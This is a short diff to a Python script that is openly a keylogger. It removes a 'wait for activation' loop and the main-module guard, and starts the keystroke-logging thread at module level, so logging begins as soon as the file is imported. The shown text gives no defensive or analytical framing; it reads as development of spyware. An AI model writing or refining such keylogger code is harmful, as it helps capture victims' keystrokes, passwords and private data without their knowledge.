@@ -29,17 +29,7 @@ def activate_logging():
     logging_active = True
     print("Keylogging activated.")
 
-# Function to listen for the activation trigger
-def listen_for_trigger():
-    global logging_active
-    print("Waiting for activation...")
-    while not logging_active:
-        time.sleep(1)  # Simulate waiting for activation
+# Start the keylogger in a separate thread
+keylogger_thread = threading.Thread(target=start_logging, daemon=True)
+keylogger_thread.start()
 
-if __name__ == "__main__":
-    # Start the keylogger in a separate thread
-    keylogger_thread = threading.Thread(target=start_logging, daemon=True)
-    keylogger_thread.start()
-
-    # Simulate listening for activation
-    listen_for_trigger()
